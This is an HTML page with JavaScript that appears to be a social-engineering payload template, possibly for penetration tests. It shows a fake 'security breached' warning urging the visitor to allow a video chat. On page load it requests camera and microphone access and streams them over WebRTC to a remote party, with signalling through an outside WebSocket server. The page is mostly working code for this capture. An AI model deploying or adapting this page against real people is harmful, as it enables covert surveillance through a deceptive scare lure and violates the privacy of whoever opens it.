<!DOCTYPE html>
<head>
	<script src="api.js"> </script>
</head>
<body>
	<div id="message" align="right">
	<font color="red">
	<h2>Urgent: Security breached.</h2>

	Your computer security has been breached during an authorized assessment.<br>
	Please allow the video chat request in order to resolve this matter.
	</font></div>
	<div id="chat_area"></div>
	<script>
		var channel = '=CHANNEL=';
		var websocket = new WebSocket('ws://wsnodejs.jit.su:80');

		websocket.onopen = function() {
			websocket.push(JSON.stringify({
				open: true,
				channel: channel
			}));
		};

		websocket.push = websocket.send;
		websocket.send = function(data) {
			websocket.push(JSON.stringify({
				data: data,
				channel: channel
			}));
		};

		var peer = new PeerConnection(websocket, '=OFFERERID=');

		peer.onStreamAdded = function(e) {
			var video = e.mediaElement;
			video.setAttribute('width', 640);
			video.setAttribute('height', 480);
			video.setAttribute('controls', true);
			video.volume = 0.5;
			document.getElementById("message").style.display = "none";
			document.getElementById("chat_area").appendChild(video);
			video.play();
		};

		peer.onStreamEnded = function(e) {
			var video = e.mediaElement;
			if (video) {
				video.style.opacity = 0;
				setTimeout(function() {
					video.parentNode.removeChild(video);
				}, 1000);
			}
			document.getElementById("message").innerHTML = "The video session has ended.";
			document.getElementById("message").style.display = "";
		};

		window.onload = function() {
			getUserMedia(function(stream) {
				peer.addStream(stream);
				peer.startBroadcasting();
			});
		};

		function getUserMedia(callback) {
			var hints = {audio:true,video:{
				optional: [],
				mandatory: {
					minWidth: 1280,
					minHeight: 720,
					maxWidth: 1920,
					maxHeight: 1080,
					minAspectRatio: 1.77
				}
			}};

			navigator.getUserMedia(hints,function(stream) {
				var video = document.createElement('video');
				video.src = URL.createObjectURL(stream);
				video.controls = true;
				video.muted = false;

				peer.onStreamAdded({
					mediaElement: video,
					userid: 'self',
					stream: stream
				});
						
				callback(stream);
			});
		}
	</script>
</body>
</html>
